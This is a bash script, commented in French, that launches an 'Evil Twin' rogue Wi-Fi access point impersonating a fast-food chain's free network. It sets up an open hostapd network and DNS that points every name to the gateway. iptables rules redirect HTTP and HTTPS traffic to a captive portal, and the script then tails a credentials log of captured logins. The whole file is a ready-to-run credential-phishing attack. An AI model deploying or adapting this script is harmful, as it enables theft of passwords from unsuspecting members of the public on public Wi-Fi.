#!/bin/bash
# ============================================================
# start_evil_twin_simple.sh — Version 1 (sans scan/deauth)
# Evil Twin statique → dnsmasq → portail captif Python
# Usage : sudo ./start_evil_twin_simple.sh
# ============================================================

IFACE="wlan1"
GATEWAY="192.168.50.1"
SSID="McDo Free Wifi"   # Nom quasi-identique au réseau légitime
CHANNEL=6
PORTAL_DIR="$HOME/captive_portal"

echo "[*] === Evil Twin Simple — Démarrage ==="

# --- 1. Sécuriser SSH sur eth0 ---
echo "[*] Ajout IP SSH sur eth0..."
sudo ip addr add 192.168.1.21/24 dev eth0 2>/dev/null || true

# --- 2. Tuer les processus qui pourraient bloquer ---
echo "[*] Nettoyage des processus..."
sudo pkill hostapd   2>/dev/null || true
sudo pkill dnsmasq   2>/dev/null || true
sudo pkill python3   2>/dev/null || true
sleep 1

# --- 3. Libérer wlan1 de NetworkManager ---
echo "[*] Libération de $IFACE de NetworkManager..."
sudo nmcli dev set "$IFACE" managed no 2>/dev/null || true
sudo ip addr flush dev "$IFACE"

# --- 4. Assigner l'IP gateway à wlan1 ---
echo "[*] Configuration IP $GATEWAY sur $IFACE..."
sudo ifconfig "$IFACE" "$GATEWAY" netmask 255.255.255.0 up

# --- 5. Écrire la config hostapd ---
echo "[*] Écriture de /tmp/hostapd_evil.conf..."
sudo tee /tmp/hostapd_evil.conf > /dev/null <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=0
ieee80211n=1
EOF

# --- 6. Écrire la config dnsmasq ---
echo "[*] Écriture de /tmp/dnsmasq_evil.conf..."
sudo tee /tmp/dnsmasq_evil.conf > /dev/null <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=192.168.50.10,192.168.50.50,255.255.255.0,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
address=/#/$GATEWAY
no-resolv
dhcp-option=114,http://$GATEWAY
EOF

# --- 7. iptables : tout rediriger vers le portail ---
echo "[*] Configuration iptables..."
sudo iptables -t nat -F
sudo iptables -F

# Rediriger HTTP → portail
sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 \
     -j DNAT --to-destination "$GATEWAY:80"

# Rediriger HTTPS → portail (downgrade)
sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 \
     -j DNAT --to-destination "$GATEWAY:80"

# Accepter le trafic entrant sur wlan1
sudo iptables -I INPUT -i "$IFACE" -p tcp --dport 80  -j ACCEPT
sudo iptables -I INPUT -i "$IFACE" -p tcp --dport 443 -j ACCEPT
sudo iptables -I INPUT -i "$IFACE" -p udp --dport 53  -j ACCEPT
sudo iptables -I INPUT -i "$IFACE" -p udp --dport 67  -j ACCEPT
sudo iptables -I FORWARD -i "$IFACE" -j ACCEPT
sudo iptables -I FORWARD -o "$IFACE" -j ACCEPT

# --- 8. Démarrer dnsmasq ---
echo "[*] Démarrage dnsmasq..."
sudo dnsmasq -C /tmp/dnsmasq_evil.conf --pid-file=/tmp/dnsmasq_evil.pid
sleep 1

# --- 9. Démarrer hostapd ---
echo "[*] Démarrage hostapd (Evil Twin : '$SSID')..."
sudo hostapd /tmp/hostapd_evil.conf -B   # -B = background
sleep 2

# --- 10. Démarrer le portail captif ---
echo "[*] Démarrage du portail captif..."
cd "$PORTAL_DIR" || { echo "[!] Dossier $PORTAL_DIR introuvable"; exit 1; }
sudo python3 server.py &
SERVER_PID=$!

echo ""
echo "============================================"
echo "  ✅  Evil Twin actif sur '$SSID'"
echo "  📡  Interface  : $IFACE @ $GATEWAY"
echo "  🌐  Portail    : http://$GATEWAY"
echo "  📋  Dashboard  : http://192.168.1.15/dashboard"
echo "  📝  Logs       : tail -f $PORTAL_DIR/credentials.log"
echo "============================================"
echo ""
echo "[*] Ctrl+C pour arrêter | PID server.py = $SERVER_PID"

# Garder le script actif pour voir les logs
tail -f "$PORTAL_DIR/credentials.log"
